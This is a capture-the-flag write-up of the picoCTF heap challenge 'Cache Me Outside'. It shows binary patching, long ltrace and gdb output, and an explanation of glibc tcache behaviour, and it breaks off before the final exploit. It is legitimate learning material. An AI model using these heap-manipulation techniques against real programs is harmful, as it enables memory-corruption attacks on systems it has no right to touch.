# Writeup of PicoCTF challenge Cache Me Outside

For this write-up I used the work of [Dvd848](https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Cache_Me_Outside.md) but I added my own thinking and problem solving ideas to complement the approach already described.

## Problem Description

AUTHOR: MADSTACKS
Description

While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations. 

- `nc mercury.picoctf.net 36605`
- [heapedit](./heapedit) 
- [Makefile](./Makefile)
- [libc.so.6](./libc.so.6)

Hint
- It may be helpful to read a little bit on GLIBC's tcache.

## Initial experimentation

When I connect to the specified server I can supply a memory address, and a byte value and then the program exits.  For example:

```
kali-amd64# nc mercury.picoctf.net 36605
You may edit one byte in the program.
Address: 23
Value: 11
t help you: this is a random string.
```

The supplied binaries are obviously there so I can do local experiments, understand the program and then tackle the actual program accessed over the network.

## Tooling

A few weird things stand out.
- Why do I have a binary, and a C runtime library and a Makefile?
- What is the tcache and why is it relevant?

When running the binary it crashes on a Kali linux box (arm64 architecture, ubuntu distribution based).

```
kali-amd64# ./heapedit
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
```

I have gdb installed on my Kali box, and also the GEF extension.  This makes it a hacker's GDB by giving you more helpful commands and informational display.

I find that gdb run of the binary fails even before `main` gets reached:

```
kali-amd64# gdb heapedit
GNU gdb (Debian 13.2-1) 13.2
.
.
Type "apropos word" to search for commands related to "word"...
break GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 13.2 in 0.03ms using Python engine 3.11
Reading symbols from heapedit...
(No debugging symbols found in heapedit)
gef➤  break main
Breakpoint 1 at 0x40080b
gef➤  r
Starting program: /home/faisal/Documents/pico-ctf/cache-me-outside/heapedit 
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
[Inferior 1 (process 379441) exited with code 0177]
```

Looking at the binary it uses its own libc:
```
kali-amd64# ldd heapedit
	linux-vdso.so.1 (0x00007ffd117cd000)
	libc.so.6 => ./libc.so.6 (0x00007fc026400000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fc026973000)
```

and the Makefile also highlights that because it has
` -Xlinker -rpath=./` which indicates it picks up its dynamic libraries from the current directory.

From looking at the write-up of Dvd848 I saw that when you need to do a binary exploitation to should use a tool to make the binary compatible on the system you are currently on.  I therefore installed [pwninit](https://github.com/io12/pwninit).  It requires `openssl-dev` `pkg-config` `patchelf` support packages installed.

Then you can run `$HOME/.cargo/bin/pwninit` and it will notice heapedit and libc.so.6 in your current directory and create patched binary `heapedit_patched`.

When I run it I get:
```
kali-amd64# ./heapedit_patched 
[1]    386364 segmentation fault  ./heapedit_patched
```

This is progress in that it starts, but fails.

Looking for obvious strings we see:
```
kali-amd64# strings heapedit_patched | grep flag
flag.txt
kali-amd64# grep -i pico heapedit_patched 
kali-amd64# 
```

There is a quick way to find out what the binary is doing at a library-call perspective, since that our binary has a custom libc in operation for it.  We need to have installed the program `ltrace`.  Then:

```
kali-amd64# ltrace -x "@libc.so.6" -o out1.txt ./heapedit_patched 
kali-amd64# cat out1.txt
__libc_start_main@libc.so.6(0x400807, 1, 0x7ffd92273828, 0x400a80 <unfinished ...>
.
.
.
fopen("flag.txt", "r" <unfinished ...>
fopen@libc.so.6("flag.txt", "r" <unfinished ...>
malloc@libc.so.6(552 <unfinished ...>
.
.
<... fopen resumed> )                                                                       = 0
.
.
<... fopen resumed> )                                                                       = 0
fgets( <unfinished ...>
fgets@libc.so.6( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

This shows that the binary needs "flags.txt", allocates 552 presumably for IO, and then later on, reading from the non-existant file crashes the program.  So we shall just create a dummy file containing `hello`.  The program then runs.

```
kali-amd64# ltrace -x "@libc.so.6" -o out2.txt ./heapedit_patched 
You may edit one byte in the program.
Address: 23
Value: 11
t help you: this is a random string.
kali-amd64# cat out2.txt
__libc_start_main@libc.so.6(0x400807, 1, 0x7ffced942728, 0x400a80 <unfinished ...>
__cxa_atexit@libc.so.6(0x7fb8942109f0, 0, 0, 0x400a80 <unfinished ...>
__new_exitfn@libc.so.6(0x7fb8941eb718, 1, 0, 0x400a80)                                      = 0x7fb8941ecd90
<... __cxa_atexit resumed> )                                                                = 0
_setjmp@libc.so.6(0x7ffced942670, 0, 0x7fb894427760, 0x400a80 <unfinished ...>
__sigsetjmp@libc.so.6(0x7ffced942670, 0, 0x7fb894427760, 0x400a80 <unfinished ...>
__sigjmp_save@libc.so.6(0x7ffced942670, 0, 0x18d9ec6d6cad4c35, 0x400a80)                    = 0
<... __sigsetjmp resumed> )                                                                 = 0
<... _setjmp resumed> )                                                                     = 0
setbuf(0x7fb8941ec760, 0 <unfinished ...>
setbuf@libc.so.6(0x7fb8941ec760, 0 <unfinished ...>
setbuffer@libc.so.6(0x7fb8941ec760, 0, 8192 <unfinished ...>
_IO_file_setbuf@libc.so.6(0x7fb8941ec760, 0, 0, 2880 <unfinished ...>
_IO_default_setbuf@libc.so.6(0x7fb8941ec760, 0, 0, 2880 <unfinished ...>
_IO_file_sync@libc.so.6(0x7fb8941ec760, 0, 0x7fb8941e7760, 2880)                            = 0
<... _IO_default_setbuf resumed> )                                                          = 0x7fb8941ec760
<... _IO_file_setbuf resumed> )                                                             = 0x7fb8941ec760
_IO_file_setbuf@libc.so.6(0x7fb8941ec760, 0, 0, 2880 <unfinished ...>
_IO_default_setbuf@libc.so.6(0x7fb8941ec760, 0, 0, 2880 <unfinished ...>
_IO_file_sync@libc.so.6(0x7fb8941ec760, 0, 0x7fb8941e7760, 2880)                            = 0
<... _IO_default_setbuf resumed> )                                                          = 0x7fb8941ec760
<... _IO_file_setbuf resumed> )                                                             = 0x7fb8941ec760
<... setbuffer resumed> )                                                                   = <void>
<... setbuf resumed> )                                                                      = <void>
<... setbuf resumed> )                                                                      = <void>
fopen("flag.txt", "r" <unfinished ...>
fopen@libc.so.6("flag.txt", "r" <unfinished ...>
malloc@libc.so.6(552 <unfinished ...>
malloc_hook_ini@libc.so.6(552, 0x7fb893e7eeba, 0x7fb8941ed8c0, 2880 <unfinished ...>
ptmalloc_init.part.0@libc.so.6(552, 0x7fb893e7eeba, 0xffffffff, 2880 <unfinished ...>
_dl_addr@libc.so.6(0x7fb893e91730, 0x7ffced9424e0, 0x7ffced9424d0, 0)                       = 1
<... ptmalloc_init.part.0 resumed> )                                                        = 0
tcache_init.part.4@libc.so.6(10, 0x7ffced9424d8, -72, 0 <unfinished ...>
_int_malloc@libc.so.6(0x7fb8941ebc40, 576, -72, 0 <unfinished ...>
sysmalloc@libc.so.6(592, 0x7fb8941ebc40, 0, 0x7fb8941ebca0 <unfinished ...>
__default_morecore@libc.so.6(0x21000, 0x7fb8941ebc40, 0x20270, 0 <unfinished ...>
sbrk@libc.so.6(135168 <unfinished ...>
brk@libc.so.6(0, 0x7fb8941ebc40, 0x20270, 0)                                                = 0
brk@libc.so.6(0x1153000, 0x7fb8941ebc40, 0x1132000, 0x7fb893f165b9)                         = 0
<... sbrk resumed> )                                                                        = 0x1132000
<... __default_morecore resumed> )                                                          = 0x1132000
__default_morecore@libc.so.6(0, 0x1153000, 0x1132000, 0x21000 <unfinished ...>
sbrk@libc.so.6(0)                                                                           = 0x1153000
<... __default_morecore resumed> )                                                          = 0x1153000
<... sysmalloc resumed> )                                                                   = 0x1132010
<... _int_malloc resumed> )                                                                 = 0x1132010
<... tcache_init.part.4 resumed> )                                                          = 0
_int_malloc@libc.so.6(0x7fb8941ebc40, 552, 0, 0x1132010)                                    = 0x1132260
<... malloc_hook_ini resumed> )                                                             = 0x1132260
<... malloc resumed> )                                                                      = 0x1132260
_IO_no_init@libc.so.6(0x1132260, 0, 0, 0x1132350 <unfinished ...>
_IO_old_init@libc.so.6(0x1132260, 0, 0, 0x1132350)                                          = 0x1132340
<... _IO_no_init resumed> )                                                                 = 0x1132340
_IO_new_file_init_internal@libc.so.6(0x1132260, 0xfbad0000, 0, 0x1132350 <unfinished ...>
_IO_link_in@libc.so.6(0x1132260, 0xfbad0000, 0, 0x1132350)                                  = 0
<... _IO_new_file_init_internal resumed> )                                                  = 0
_IO_file_fopen@libc.so.6(0x1132260, 0x400b0a, 0x400b08, 1 <unfinished ...>
open@libc.so.6("flag.txt", 0, 0666)                                                         = 3
_IO_link_in@libc.so.6(0x1132260, 0x400b0a, 0, 0)                                            = 0
__GI_strstr@libc.so.6(0x400b09, 0x7fb893fb4ef7, 0, 0)                                       = 0
<... _IO_file_fopen resumed> )                                                              = 0x1132260
<... fopen resumed> )                                                                       = 0x1132260
<... fopen resumed> )                                                                       = 0x1132260
fgets( <unfinished ...>
fgets@libc.so.6( <unfinished ...>
_IO_getline@libc.so.6(0x1132260, 0x7ffced9425f0, 63, 10 <unfinished ...>
__uflow@libc.so.6(0x1132260, 0x7ffced9425f0, 63, 10 <unfinished ...>
_IO_default_uflow@libc.so.6(0x1132260, 0, 0x7fb8941e7760, 2880 <unfinished ...>
_IO_file_underflow@libc.so.6(0x1132260, 0, 0x7fb8941e7760, 2880 <unfinished ...>
_IO_doallocbuf@libc.so.6(0x1132260, 0, 0, 2880 <unfinished ...>
_IO_file_doallocate@libc.so.6(0x1132260, 0, 0x7fb8941e7760, 2880 <unfinished ...>
_IO_file_stat@libc.so.6(0x1132260, 0x7ffced9423e0, 0x7fb8941e7760, 2880 <unfinished ...>
_fxstat@libc.so.6(1, 3, 0x7ffced9423e0, 2880)                                               = 0
<... _IO_file_stat resumed> )                                                               = 0
malloc@libc.so.6(4096 <unfinished ...>
_int_malloc@libc.so.6(0x7fb8941ebc40, 4096, 0x7ffced942300, 0x1132010)                      = 0x1132490
<... malloc resumed> )                                                                      = 0x1132490
_IO_setb@libc.so.6(0x1132260, 0x1132490, 0x1133490, 1)                                      = 0xfbad2488
<... _IO_file_doallocate resumed> )                                                         = 1
<... _IO_doallocbuf resumed> )                                                              = 1
_IO_switch_to_get_mode@libc.so.6(0x1132260, 0x1132490, 0xfbad2488, 0)                       = 0
_IO_file_read@libc.so.6(0x1132260, 0x1132490, 4096, 0x1132490 <unfinished ...>
read@libc.so.6(3, "hello\n", 4096)                                                          = 6
<... _IO_file_read resumed> )                                                               = 6
<... _IO_file_underflow resumed> )                                                          = 104
<... _IO_default_uflow resumed> )                                                           = 104
<... __uflow resumed> )                                                                     = 104
__memchr_sse2@libc.so.6(0x1132491, 10, 5, 0x7fb893f10191)                                   = 0x1132495
memcpy@libc.so.6(0x7ffced9425f1, "ello\n", 5)                                               = 0x7ffced9425f1
<... _IO_getline resumed> )                                                                 = 6
<... fgets resumed> "hello\n", 64, 0x1132260)                                               = 0x7ffced9425f0
<... fgets resumed> "hello\n", 64, 0x1132260)                                               = 0x7ffced9425f0
malloc(128 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
_int_malloc@libc.so.6(0x7fb8941ebc40, 128, 0, 0x1132010)                                    = 0x11334a0
<... malloc resumed> )                                                                      = 0x11334a0
<... malloc resumed> )                                                                      = 0x11334a0
strcat("Congrats! Your flag is: ", "hello\n" <unfinished ...>
strcat_ifunc@libc.so.6(0x7fb893e1777f, 0x7fb893e0b3b8, 10, 1)                               = 0x7fb893eb93e0
__strcat_sse2@libc.so.6(0x11334a0, 0x7ffced9425f0, 0x7ffced9425f0, 0x203a73692067616c)      = 0x11334a0
<... strcat resumed> )                                                                      = "Congrats! Your flag is: hello\n"
malloc(128 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
_int_malloc@libc.so.6(0x7fb8941ebc40, 128, 0, 0x1132010)                                    = 0x1133530
<... malloc resumed> )                                                                      = 0x1133530
<... malloc resumed> )                                                                      = 0x1133530
strcat("Congrats! Your flag is: ", "hello\n" <unfinished ...>
__strcat_sse2@libc.so.6(0x1133530, 0x7ffced9425f0, 0x7ffced9425f0, 0x203a73692067616c)      = 0x1133530
<... strcat resumed> )                                                                      = "Congrats! Your flag is: hello\n"
malloc(128 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
_int_malloc@libc.so.6(0x7fb8941ebc40, 128, 0, 0x1132010)                                    = 0x11335c0
<... malloc resumed> )                                                                      = 0x11335c0
<... malloc resumed> )                                                                      = 0x11335c0
strcat("Congrats! Your flag is: ", "hello\n" <unfinished ...>
__strcat_sse2@libc.so.6(0x11335c0, 0x7ffced9425f0, 0x7ffced9425f0, 0x203a73692067616c)      = 0x11335c0
<... strcat resumed> )                                                                      = "Congrats! Your flag is: hello\n"
malloc(128 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
_int_malloc@libc.so.6(0x7fb8941ebc40, 128, 0, 0x1132010)                                    = 0x1133650
<... malloc resumed> )                                                                      = 0x1133650
<... malloc resumed> )                                                                      = 0x1133650
strcat("Congrats! Your flag is: ", "hello\n" <unfinished ...>
__strcat_sse2@libc.so.6(0x1133650, 0x7ffced9425f0, 0x7ffced9425f0, 0x203a73692067616c)      = 0x1133650
<... strcat resumed> )                                                                      = "Congrats! Your flag is: hello\n"
malloc(128 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
_int_malloc@libc.so.6(0x7fb8941ebc40, 128, 0, 0x1132010)                                    = 0x11336e0
<... malloc resumed> )                                                                      = 0x11336e0
<... malloc resumed> )                                                                      = 0x11336e0
strcat("Congrats! Your flag is: ", "hello\n" <unfinished ...>
__strcat_sse2@libc.so.6(0x11336e0, 0x7ffced9425f0, 0x7ffced9425f0, 0x203a73692067616c)      = 0x11336e0
<... strcat resumed> )                                                                      = "Congrats! Your flag is: hello\n"
malloc(128 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
_int_malloc@libc.so.6(0x7fb8941ebc40, 128, 0, 0x1132010)                                    = 0x1133770
<... malloc resumed> )                                                                      = 0x1133770
<... malloc resumed> )                                                                      = 0x1133770
strcat("Congrats! Your flag is: ", "hello\n" <unfinished ...>
__strcat_sse2@libc.so.6(0x1133770, 0x7ffced9425f0, 0x7ffced9425f0, 0x203a73692067616c)      = 0x1133770
<... strcat resumed> )                                                                      = "Congrats! Your flag is: hello\n"
malloc(128 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
_int_malloc@libc.so.6(0x7fb8941ebc40, 128, 0, 0x1132010)                                    = 0x1133800
<... malloc resumed> )                                                                      = 0x1133800
<... malloc resumed> )                                                                      = 0x1133800
strcat("Congrats! Your flag is: ", "hello\n" <unfinished ...>
__strcat_sse2@libc.so.6(0x1133800, 0x7ffced9425f0, 0x7ffced9425f0, 0x203a73692067616c)      = 0x1133800
<... strcat resumed> )                                                                      = "Congrats! Your flag is: hello\n"
malloc(128 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
_int_malloc@libc.so.6(0x7fb8941ebc40, 128, 0, 0x1132010)                                    = 0x1133890
<... malloc resumed> )                                                                      = 0x1133890
<... malloc resumed> )                                                                      = 0x1133890
strcat("Sorry! This won't help you: ", "this is a random string." <unfinished ...>
__strcat_sse2@libc.so.6(0x1133890, 0x7ffced9425d0, 0x7ffced9425d0, 0x7920706c65682074)      = 0x1133890
<... strcat resumed> )                                                                      = "Sorry! This won't help you: this"...
free(0x1133800 <unfinished ...>
free@libc.so.6(0x1133800)                                                                   = <void>
<... free resumed> )                                                                        = <void>
free(0x1133890 <unfinished ...>
free@libc.so.6(0x1133890)                                                                   = <void>
<... free resumed> )                                                                        = <void>
puts("You may edit one byte in the pro"... <unfinished ...>
puts@libc.so.6("You may edit one byte in the pro"... <unfinished ...>
__strlen_sse2@libc.so.6(0x400b18, 0x1132048, 0x1132010, 2)                                  = 37
_IO_file_xsputn@libc.so.6(0x7fb8941ec760, 0x400b18, 37, 2880 <unfinished ...>
_IO_file_overflow@libc.so.6(0x7fb8941ec760, 0xffffffff, 2880, 2880 <unfinished ...>
_IO_do_write@libc.so.6(0x7fb8941ec760, 0x7fb8941ec7e3, 0, 2)                                = 0
<... _IO_file_overflow resumed> )                                                           = 0
_IO_file_write@libc.so.6(0x7fb8941ec760, 0x400b18, 37, 0x7fb8941ec7e3 <unfinished ...>
write@libc.so.6(1, "You may edit one byte in the pro"..., 37)                               = 37
<... _IO_file_write resumed> )                                                              = 37
<... _IO_file_xsputn resumed> )                                                             = 37
__overflow@libc.so.6(0x7fb8941ec760, 10, 0xffffffff, 0x7fb893f10264 <unfinished ...>
_IO_file_overflow@libc.so.6(0x7fb8941ec760, 10, 0x7fb8941e7760, 2880 <unfinished ...>
_IO_do_write@libc.so.6(0x7fb8941ec760, 0x7fb8941ec7e3, 1, 0xfbad2887 <unfinished ...>
_IO_file_write@libc.so.6(0x7fb8941ec760, 0x7fb8941ec7e3, 1, 0xfbad2887 <unfinished ...>
write@libc.so.6(1, "\n", 1)                                                                 = 1
<... _IO_file_write resumed> )                                                              = 1
<... _IO_do_write resumed> )                                                                = 0
<... _IO_file_overflow resumed> )                                                           = 10
<... __overflow resumed> )                                                                  = 10
<... puts resumed> )                                                                        = 38
<... puts resumed> )                                                                        = 38
printf("Address: " <unfinished ...>
printf@libc.so.6("Address: " <unfinished ...>
vfprintf@libc.so.6(0x7fb8941ec760, "Address: ", 0x7ffced9424a0 <unfinished ...>
buffered_vfprintf@libc.so.6(0x7fb8941ec760, 0x400b3e, 0x7ffced9424a0, 0x7fb893f10264 <unfinished ...>
vfprintf@libc.so.6(0x7ffced93fde0, "Address: ", 0x7ffced9424a0 <unfinished ...>
__strchrnul_sse2@libc.so.6(0x400b3e, 37, 0x7ffced9424a0, 0x7fb893f10264)                    = 0x400b47
_IO_default_xsputn@libc.so.6(0x7ffced93fde0, 0x400b3e, 9, 0x7fb8941e7760)                   = 9
<... vfprintf resumed> )                                                                    = 9
_IO_file_xsputn@libc.so.6(0x7fb8941ec760, 0x7ffced93fee0, 9, 2880 <unfinished ...>
_IO_file_overflow@libc.so.6(0x7fb8941ec760, 0xffffffff, 2880, 2880 <unfinished ...>
_IO_do_write@libc.so.6(0x7fb8941ec760, 0x7fb8941ec7e3, 0, 0xfbad2887)                       = 0
<... _IO_file_overflow resumed> )                                                           = 0
_IO_file_write@libc.so.6(0x7fb8941ec760, 0x7ffced93fee0, 9, 0x7fb8941ec7e3 <unfinished ...>
write@libc.so.6(1, "Address: ", 9)                                                          = 9
<... _IO_file_write resumed> )                                                              = 9
<... _IO_file_xsputn resumed> )                                                             = 9
<... buffered_vfprintf resumed> )                                                           = 9
<... vfprintf resumed> )                                                                    = 9
<... printf resumed> )                                                                      = 9
<... printf resumed> )                                                                      = 9
__isoc99_scanf(0x400b48, 0x7ffced9425a0, 0x7fb8941ed8c0, 0 <unfinished ...>
__isoc99_scanf@libc.so.6(0x400b48, 0x7ffced9425a0, 0x7fb8941ed8c0, 0 <unfinished ...>
_IO_vfscanf@libc.so.6(0x7fb8941eba00, 0x400b48, 0x7ffced9424a0, 0 <unfinished ...>
__uflow@libc.so.6(0x7fb8941eba00, 0xffffffff, 0, 61 <unfinished ...>
_IO_default_uflow@libc.so.6(0x7fb8941eba00, 0, 0x7fb8941e7760, 2880 <unfinished ...>
_IO_file_underflow@libc.so.6(0x7fb8941eba00, 0, 0x7fb8941e7760, 2880 <unfinished ...>
_IO_doallocbuf@libc.so.6(0x7fb8941eba00, 0, 0, 2880 <unfinished ...>
_IO_file_doallocate@libc.so.6(0x7fb8941eba00, 0, 0x7fb8941e7760, 2880 <unfinished ...>
_IO_file_stat@libc.so.6(0x7fb8941eba00, 0x7ffced941c80, 0x7fb8941e7760, 2880 <unfinished ...>
_fxstat@libc.so.6(1, 0, 0x7ffced941c80, 2880)                                               = 0
<... _IO_file_stat resumed> )                                                               = 0
malloc@libc.so.6(1024 <unfinished ...>
_int_malloc@libc.so.6(0x7fb8941ebc40, 1024, 0, 0x1132010)                                   = 0x1133920
<... malloc resumed> )                                                                      = 0x1133920
_IO_setb@libc.so.6(0x7fb8941eba00, 0x1133920, 0x1133d20, 1)                                 = 0xfbad2288
<... _IO_file_doallocate resumed> )                                                         = 1
<... _IO_doallocbuf resumed> )                                                              = 1
_IO_switch_to_get_mode@libc.so.6(0x7fb8941eba00, 1, 0x7fb8941ed8c0, 0)                      = 0
_IO_file_read@libc.so.6(0x7fb8941eba00, 0x1133920, 1024, 0x1133920 <unfinished ...>
read@libc.so.6(0, "23\n", 1024)                                                             = 3
<... _IO_file_read resumed> )                                                               = 3
<... _IO_file_underflow resumed> )                                                          = 50
<... _IO_default_uflow resumed> )                                                           = 50
<... __uflow resumed> )                                                                     = 50
_IO_sputbackc@libc.so.6(0x7fb8941eba00, 50, 0, 0)                                           = 50
_IO_sputbackc@libc.so.6(0x7fb8941eba00, 10, 2, 0x1133923)                                   = 10
__strtol_internal@libc.so.6("23", 0x7ffced941ea8, 10 <unfinished ...>
____strtol_l_internal@libc.so.6(0x7ffced942040, 0x7ffced941ea8, 10, 0)                      = 23
<... __strtol_internal resumed> )                                                           = 23
<... _IO_vfscanf resumed> )                                                                 = 1
<... __isoc99_scanf resumed> )                                                              = 1
<... __isoc99_scanf resumed> )                                                              = 1
printf("Value: " <unfinished ...>
printf@libc.so.6("Value: " <unfinished ...>
vfprintf@libc.so.6(0x7fb8941ec760, "Value: ", 0x7ffced9424a0 <unfinished ...>
buffered_vfprintf@libc.so.6(0x7fb8941ec760, 0x400b4b, 0x7ffced9424a0, 16 <unfinished ...>
vfprintf@libc.so.6(0x7ffced93fde0, "Value: ", 0x7ffced9424a0 <unfinished ...>
__strchrnul_sse2@libc.so.6(0x400b4b, 37, 0x7ffced9424a0, 16)                                = 0x400b52
_IO_default_xsputn@libc.so.6(0x7ffced93fde0, 0x400b4b, 7, 0x7fb8941e7760)                   = 7
<... vfprintf resumed> )                                                                    = 7
_IO_file_xsputn@libc.so.6(0x7fb8941ec760, 0x7ffced93fee0, 7, 2880 <unfinished ...>
_IO_file_overflow@libc.so.6(0x7fb8941ec760, 0xffffffff, 2880, 2880 <unfinished ...>
_IO_do_write@libc.so.6(0x7fb8941ec760, 0x7fb8941ec7e3, 0, 0xfbad2887)                       = 0
<... _IO_file_overflow resumed> )                                                           = 0
_IO_file_write@libc.so.6(0x7fb8941ec760, 0x7ffced93fee0, 7, 0x7fb8941ec7e3 <unfinished ...>
write@libc.so.6(1, "Value: ", 7)                                                            = 7
<... _IO_file_write resumed> )                                                              = 7
<... _IO_file_xsputn resumed> )                                                             = 7
<... buffered_vfprintf resumed> )                                                           = 7
<... vfprintf resumed> )                                                                    = 7
<... printf resumed> )                                                                      = 7
<... printf resumed> )                                                                      = 7
__isoc99_scanf(0x400b53, 0x7ffced94259f, 0x7fb8941ed8c0, 0 <unfinished ...>
__isoc99_scanf@libc.so.6(0x400b53, 0x7ffced94259f, 0x7fb8941ed8c0, 0 <unfinished ...>
_IO_vfscanf@libc.so.6(0x7fb8941eba00, 0x400b53, 0x7ffced9424a0, 0 <unfinished ...>
__uflow@libc.so.6(0x7fb8941eba00, 0xffffffff, 0, 8194 <unfinished ...>
_IO_default_uflow@libc.so.6(0x7fb8941eba00, 0x1133923, 0x7fb8941e7760, 2880 <unfinished ...>
_IO_file_underflow@libc.so.6(0x7fb8941eba00, 0x1133923, 0x7fb8941e7760, 2880 <unfinished ...>
_IO_switch_to_get_mode@libc.so.6(0x7fb8941eba00, 1, 0x7fb8941ed8c0, 2880)                   = 0
_IO_file_read@libc.so.6(0x7fb8941eba00, 0x1133920, 1024, 0x1133920 <unfinished ...>
read@libc.so.6(0, "11\n", 1024)                                                             = 3
<... _IO_file_read resumed> )                                                               = 3
<... _IO_file_underflow resumed> )                                                          = 49
<... _IO_default_uflow resumed> )                                                           = 49
<... __uflow resumed> )                                                                     = 49
_IO_sputbackc@libc.so.6(0x7fb8941eba00, 49, 0, 1)                                           = 49
<... _IO_vfscanf resumed> )                                                                 = 1
<... __isoc99_scanf resumed> )                                                              = 1
<... __isoc99_scanf resumed> )                                                              = 1
malloc(128 <unfinished ...>
malloc@libc.so.6(128)                                                                       = 0x1133890
<... malloc resumed> )                                                                      = 0x1133890
puts("t help you: this is a random str"... <unfinished ...>
puts@libc.so.6("t help you: this is a random str"... <unfinished ...>
__strlen_sse2@libc.so.6(0x11338a0, 0x1132048, 0x1133890, 0x1132010)                         = 36
_IO_file_xsputn@libc.so.6(0x7fb8941ec760, 0x11338a0, 36, 2880 <unfinished ...>
_IO_file_overflow@libc.so.6(0x7fb8941ec760, 0xffffffff, 2880, 2880 <unfinished ...>
_IO_do_write@libc.so.6(0x7fb8941ec760, 0x7fb8941ec7e3, 0, 0xfbad2887)                       = 0
<... _IO_file_overflow resumed> )                                                           = 0
_IO_file_write@libc.so.6(0x7fb8941ec760, 0x11338a0, 36, 0x7fb8941ec7e3 <unfinished ...>
write@libc.so.6(1, "t help you: this is a random str"..., 36)                               = 36
<... _IO_file_write resumed> )                                                              = 36
<... _IO_file_xsputn resumed> )                                                             = 36
__overflow@libc.so.6(0x7fb8941ec760, 10, 0xffffffff, 0x7fb893f10264 <unfinished ...>
_IO_file_overflow@libc.so.6(0x7fb8941ec760, 10, 0x7fb8941e7760, 2880 <unfinished ...>
_IO_do_write@libc.so.6(0x7fb8941ec760, 0x7fb8941ec7e3, 1, 0xfbad2887 <unfinished ...>
_IO_file_write@libc.so.6(0x7fb8941ec760, 0x7fb8941ec7e3, 1, 0xfbad2887 <unfinished ...>
write@libc.so.6(1, "\n", 1)                                                                 = 1
<... _IO_file_write resumed> )                                                              = 1
<... _IO_do_write resumed> )                                                                = 0
<... _IO_file_overflow resumed> )                                                           = 10
<... __overflow resumed> )                                                                  = 10
<... puts resumed> )                                                                        = 37
<... puts resumed> )                                                                        = 37
exit@libc.so.6(0 <unfinished ...>
__run_exit_handlers@libc.so.6(0, 0x7fb8941eb718, 1, 1 <unfinished ...>
__call_tls_dtors@libc.so.6(0, 0x7fb8941eb718, 1, 1)                                         = 0
_IO_cleanup@libc.so.6(0x7fb894428968, 1, 0x7fb8941e7740, 0 <unfinished ...>
_IO_flush_all_lockp@libc.so.6(0, 1, 0x7fb8941e7740, 0)                                      = 0
_IO_file_setbuf@libc.so.6(0x1132260, 0, 0, 1 <unfinished ...>
_IO_default_setbuf@libc.so.6(0x1132260, 0, 0, 1 <unfinished ...>
_IO_file_sync@libc.so.6(0x1132260, 0, 0x7fb8941e7760, 2880)                                 = 0
<... _IO_default_setbuf resumed> )                                                          = 0x1132260
<... _IO_file_setbuf resumed> )                                                             = 0x1132260
_IO_file_setbuf@libc.so.6(0x7fb8941eba00, 0, 0, 1 <unfinished ...>
_IO_default_setbuf@libc.so.6(0x7fb8941eba00, 0, 0, 1 <unfinished ...>
_IO_file_sync@libc.so.6(0x7fb8941eba00, 0, 0x7fb8941e7760, 2880 <unfinished ...>
_IO_file_seek@libc.so.6(0x7fb8941eba00, -2, 1, 2880 <unfinished ...>
lseek@libc.so.6(0, -2, 1)                                                                   = -1
<... _IO_file_seek resumed> )                                                               = -1
<... _IO_file_sync resumed> )                                                               = 0
<... _IO_default_setbuf resumed> )                                                          = 0x7fb8941eba00
<... _IO_file_setbuf resumed> )                                                             = 0x7fb8941eba00
<... _IO_cleanup resumed> )                                                                 = 0
_exit@libc.so.6(0 <no return ...>
+++ exited (status 0) +++
```

## Consider the Heap

The topic of this problem is the Heap, and it is mentioned a few times.  Using our above trace, we can see what malloc or free is done on the Heap.

```
kali-amd64# egrep '^malloc@|^free@' out2.txt
malloc@libc.so.6(552 <unfinished ...>
malloc@libc.so.6(4096 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
malloc@libc.so.6(128 <unfinished ...>
free@libc.so.6(0x1133800)                                                                   = <void>
free@libc.so.6(0x1133890)                                                                   = <void>
malloc@libc.so.6(1024 <unfinished ...>
malloc@libc.so.6(128)                                                                       = 0x1133890
```

As we can see there are 8 mallocs of size 128, two frees, and another malloc of 128.  The rest we are ignoring (probably file handling code, etc).

Looking for documentation on tcache on the Internet does not turn up much apart from an in-depth analysis at [Azeria Labs Glibc Heap Free Bins](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)

On the section for t-cache it says:
> By default, each thread has 64 singly-linked tcache bins. Each bin contains a maximum of 7 same-size chunks ranging from 24 to 1032 bytes on 64-bit systems and 12 to 516 bytes on 32-bit systems.

The t-cache is a thread-specific optimisation to give you a pointer to memory of length x if you so happened to recently free something of length x.  This avoids it having to get a lock across all the threads in the given process (costly in time).

So our allocs/frees fit the pattern.  8 allocs goes over the 7 t-cache bins limit, then down to 6 and then 7.

## Solution

I defer to the previous write-up by Dvd848 for an explanation of the code and strategy.
But picking up from the second free, for which I had a breakpoint, this is how I found the memory reference and did the memory offset calculation:
```
Breakpoint 9, 0x00000000004009b4 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x2               
$rdx   : 0x0000000000602010  →  0x0200000000000000
$rsp   : 0x00007fffffffdff0  →  0x00007fffffffe198  →  0x00007fffffffe457  →  "/home/faisal/Documents/pico-ctf/cache-me-outside/h[...]"
$rbp   : 0x00007fffffffe0b0  →  0x0000000000400a80  →  <__libc_csu_init+0> push r15
$rsi   : 0x0000000000602048  →  0x0000000000000000
$rdi   : 0x0000000000603800  →  0x0000000000000000
$rip   : 0x00000000004009b4  →  <main+429> mov DWORD PTR [rbp-0xa0], 0x0
$r8    : 0xfefefefefefefeff
$r9    : 0xfeff7efef6bf24ff
